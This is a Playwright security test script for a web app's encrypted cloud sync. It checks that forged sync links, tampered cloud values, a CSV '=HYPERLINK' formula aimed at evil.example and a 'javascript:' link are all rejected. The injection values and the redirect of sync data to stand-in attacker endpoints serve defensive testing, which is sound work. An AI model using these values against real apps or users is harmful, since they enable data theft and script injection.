const { chromium } = require('playwright');
const MY='https://script.google.com/macros/s/MINE/exec', EVIL='https://script.google.com/macros/s/ATTACKER/exec';
let cloud={}, evil={};
(async () => {
  const b = await chromium.launch(); const res=[]; const ok=(n,c,d='')=>res.push((c?'PASS ':'FAIL ')+n+(d?' ('+d+')':''));
  const mk = async (dialogAnswer=true) => { const ctx = await b.newContext({acceptDownloads:true}); await ctx.route(/^https?:\/\/(?!localhost)/, async r=>{ const u=r.request().url(), m=r.request().method(); const j=o=>r.fulfill({contentType:'application/json',body:JSON.stringify(o)});
    if(u.startsWith(MY)){ if(m==='POST'){ cloud=JSON.parse(r.request().postData()); return j({ok:1}); } return j(cloud); }
    if(u.startsWith(EVIL)){ if(m==='POST'){ evil=JSON.parse(r.request().postData()); return j({ok:1}); } return j(evil); }
    return r.abort(); }); const p = await ctx.newPage(); p.errs=[]; p.on('pageerror',e=>p.errs.push(e.message)); p.on('dialog',d=> dialogAnswer ? d.accept() : d.dismiss()); return p; };
  const setup = async (p, pass, key) => { await p.goto((process.env.BASE||'http://localhost:8765')+'/finder.html'); await p.waitForTimeout(500);
    await p.evaluate(([s,pw,k])=>{ document.getElementById('setBox').open=true; document.getElementById('syncUrl').value=s; document.getElementById('syncPass').value=pw; if(k) document.getElementById('apiKey').value=k; }, [MY,pass,key]);
    await p.click('#saveSet'); await p.waitForTimeout(2500); };
  // old cloud content (plain), as today
  cloud = { mp_myEmail:{v:'mappeak.local@gmail.com',t:1}, mp_follow:{v:'[{"id":"o1","n":"Old Client","state":"waiting","at":1}]',t:1} };
  const A = await mk(); await setup(A, 'Correct-Horse-9', 'AIzaVICTIMKEY');
  ok('S1 cloud now locked (no readable key or clients)', JSON.stringify(cloud).indexOf('AIzaVICTIMKEY')<0 && JSON.stringify(cloud).indexOf('Old Client')<0 && /enc1:/.test(JSON.stringify(cloud)));
  ok('S2 status shows lock', /🔒/.test(await A.textContent('#syncState')));
  // second device, same password -> gets everything
  const B = await mk(); await setup(B, 'Correct-Horse-9');
  ok('S3 second device with same password opens it', (await B.inputValue('#apiKey'))==='AIzaVICTIMKEY');
  // device without password must not overwrite locked cloud
  const before = JSON.stringify(cloud); const C = await mk(); await setup(C, '');
  ok('S4 device without password: no overwrite, asks for password', !/"v":"(?!enc1:)/.test(JSON.stringify(cloud)) && /پاس ورڈ/.test(await C.textContent('#syncState')));
  // wrong password must not overwrite
  const D = await mk(); await setup(D, 'wrong-password-1');
  ok('S5 wrong password: no overwrite, warns', (await B.inputValue('#apiKey'))==='AIzaVICTIMKEY' && /نہیں ملتا/.test(await D.textContent('#syncState')));
  // attacker with only the URL writes plain values
  const t=Date.now()+60000; cloud.mp_myEmail={v:'support@attacker.example',t}; cloud.mp_hideNames={v:'["a","e"]',t};
  await A.click('#syncNow'); await A.waitForTimeout(2500);
  ok('S6 attacker plain writes ignored', (await A.inputValue('#myEmail'))!=='support@attacker.example' && (await A.evaluate(()=>localStorage.getItem('mp_hideNames')||'[]'))!=='["a","e"]');
  // attacker tampers a sealed value / swaps keys
  const sealedKey = cloud.mp_apiKey.v; cloud.mp_myEmail = {v: sealedKey, t: Date.now()+120000};
  await A.click('#syncNow'); await A.waitForTimeout(2500);
  ok('S7 swapped sealed value rejected', (await A.inputValue('#myEmail'))!=='AIzaVICTIMKEY');
  // personal link: attacker URL -> refused when user says Cancel; invalid url ignored
  const payload = o => Buffer.from(JSON.stringify(o)).toString('base64').replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
  const E = await mk(false); await E.goto((process.env.BASE||'http://localhost:8765')+'/finder.html#s='+payload({syncUrl:EVIL, apiKey:'AIzaATTACKER'})); await E.waitForTimeout(600);
  ok('S8 fake personal link: Cancel keeps phone clean', !(await E.evaluate(()=>localStorage.getItem('mp_syncUrl'))) && !/#s=/.test(E.url()));
  const F = await mk(true); await F.goto((process.env.BASE||'http://localhost:8765')+'/finder.html#s='+payload({syncUrl:'https://evil.example/collect', apiKey:'AIzaX'})); await F.waitForTimeout(600);
  ok('S9 non-Google sync link in a personal link is ignored', !(await F.evaluate(()=>localStorage.getItem('mp_syncUrl'))));
  // real personal link carries password -> new phone works
  await A.click('#myLink'); await A.waitForTimeout(300); const link = await A.inputValue('#myLinkOut');
  const G = await mk(true); await G.goto(link.replace(/^.*finder\.html/, (process.env.BASE||'http://localhost:8765')+'/finder.html')); await G.waitForTimeout(3500);
  ok('S10 own personal link restores lock + data on new phone', (await G.inputValue('#apiKey'))==='AIzaVICTIMKEY' && /🔒/.test(await G.textContent('#syncState')));
  // CSV + javascript link
  await A.evaluate(()=>{ document.getElementById('pipeBox').open=true; document.querySelectorAll('#pipeBox details').forEach(d=>d.open=true); });
  await A.fill('#mName','=HYPERLINK("http://evil.example","x")'); await A.click('#mAdd'); await A.waitForTimeout(300);
  const [dl] = await Promise.all([A.waitForEvent('download'), A.click('#pipeCsv')]); const csv = require('fs').readFileSync(await dl.path(),'utf8');
  ok('S11 CSV formula neutralised', /"'=HYPERLINK/.test(csv) && !/"=HYPERLINK/.test(csv));
  await A.evaluate(()=>{ localStorage.setItem('mp_gone', JSON.stringify([{id:'g',n:'X',w:'javascript:alert(1)'}])); });
  await A.reload(); await A.waitForTimeout(800);
  ok('S12 javascript: website never becomes a link', (await A.$$eval('a[href^="javascript:"]', a=>a.length))===0);
  res.push('errors: '+JSON.stringify([A,B,C,D,E,F,G].flatMap(x=>x.errs)));
  console.log(res.join('\n')); await b.close();
})();
